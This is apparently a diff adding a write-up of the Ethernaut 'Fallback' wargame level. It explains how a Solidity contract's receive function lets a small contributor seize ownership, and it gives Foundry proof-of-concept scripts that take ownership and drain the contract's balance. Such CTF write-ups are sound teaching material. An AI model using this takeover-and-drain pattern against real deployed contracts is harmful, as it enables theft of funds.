@@ -1,0 +1,125 @@
+"This level deals with the fallback functions (receive and fallback) present in Solidity. 
+The main objectives of this level are:
+receive
+fallback
+There are 3 functions of importance in the code. They are - 
+Let's talk about them one by one. 
+function contribute() public payable {
+    require(msg.value < 0.001 ether); //send < 0.001 ether
+    contributions[msg.sender] += msg.value; // add the contribution for `msg.sender`
+    if(contributions[msg.sender] > contributions[owner]) {
+        owner = msg.sender; //if msg.sender has more contribution, then they become the new owner
+    }
+}
+
+This is a payable function that allows anyone to call it and send some Ether in the msg.value given that the amount is less than 0.001 Ether. 
+payable
+msg.value
+0.001
+It also increments the sent ether in the contributions mapping for the msg.sender (the user who sent the ETH or made the function call). 
+contributions
+msg.sender
+There's another statement here that checks if our user's contribution is more than the owner's contribution, which is 1000 Ether as defined in the constructor. If it is, then our user will become the new owner. 
+1000
+receive() external payable {
+    require(msg.value > 0 && contributions[msg.sender] > 0);
+    owner = msg.sender; //if the conditions are satisfied, msg.sender becomes new owner
+}
+
+This is a fallback function responsible for receiving the Ether. It is triggered when a call is made to the contract with no calldata such as the send, transfer, and call functions.  
+calldata
+send
+transfer
+call
+This function has two validations to allow users to trigger the function - 
+msg.value
+> 0
+contribute()
+  function withdraw() public onlyOwner { //only contract owner can call this function
+    owner.transfer(address(this).balance); //transfer contract's balance to the owner
+  }
+
+This function will be used at later stages to withdraw the Ether from the contract once our user claims ownership of the contract. Note the onlyOwner modifier used as an access control validation on the function. 
+onlyOwner
+To successfully complete the level, we can do two things to become the new owner. 
+contribute
+< 0.001
+receive()
+msg.value > 0
+receive()
+msg.value
+contributions[msg.sender] > 0
+contribute()
+msg.value
+contributions[msg.sender] += msg.value;
+Therefore, our exploitation involves us calling the contribute() with some Ether value less than 0.001. This will allow us to trigger the receive() function making us the owner. 
+Once we become the new owner, we can call the withdraw() function to drain all the Ether from the contract and complete the level. 
+contribute()
+receive()
+withdraw()
+I'll be using foundry scripts to write a PoC. We'll keep all our test scripts in the test directory and the final PoC scripts to broadcast in the script directory. Refer to the Github repository for the updated code and the first article in the series for a detailed setup guide. 
+test
+script
+Here's our first test script:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""forge-std/Test.sol"";
+import ""../instances/Ilevel01.sol"";
+
+contract POC is Test {
+    Fallback level1 = Fallback(0xFEa5EC80853C53c7083F9027BE97130F3836D460);
+
+    function test() external {
+        vm.startBroadcast();
+
+        level1.contribute{value: 1 wei}(); // call the contribute function with some ether/wei
+        level1.getContribution(); // get the contribution for our user to make sure its updated
+        address(level1).transfer(1 wei); // make a transfer call to trigger the receive function and become the new owner
+        level1.owner(); // check who is the new owner
+
+        vm.stopBroadcast();
+    }
+}
+
+Execute the above script using forge test -vvvv. The most beautiful thing about this is that it'll give you the response for each function execution inside traces and will tell you what went wrong. 
+forge test -vvvv
+It can be seen below that my fallback transaction ran out of gas and was reverted. 
+
+To circumvent the error, we can use call(). transfer and send forwards only 2300 gas whereas call forwards all the gas or the amount which is set. 
+Note that when you want to just send Ether to another contract via a fallback function, call() is the recommended approach. 
+call()
+transfer
+send
+call
+call()
+
+Now that we know it is working, it's time to broadcast this on the network using the following command:
+forge script ./script/level01.sol --private-key $PKEY --broadcast -vvvv --rpc-url $RPC_URL
+
+Here's our final PoC:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""forge-std/Script.sol"";
+import ""../instances/Ilevel01.sol"";
+
+contract POC is Script {
+    Fallback level1 = Fallback(0xFEa5EC80853C53c7083F9027BE97130F3836D460);
+
+    function run() external {
+        vm.startBroadcast();
+
+        level1.contribute{value: 1 wei}(); // contribute some Ether/Wei
+        level1.getContribution(); // check how much my contribution is
+        address(level1).call{value: 1 wei}(""""); // trigger the fallback function
+        level1.owner(); // query new owner
+        level1.withdraw(); // withdraw all the Ether
+
+        vm.stopBroadcast();
+    }
+}
+
+
+All our function calls were successful. We became the new owner as can be seen in the traces. Now we can submit the instance to finish the level. 
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry"
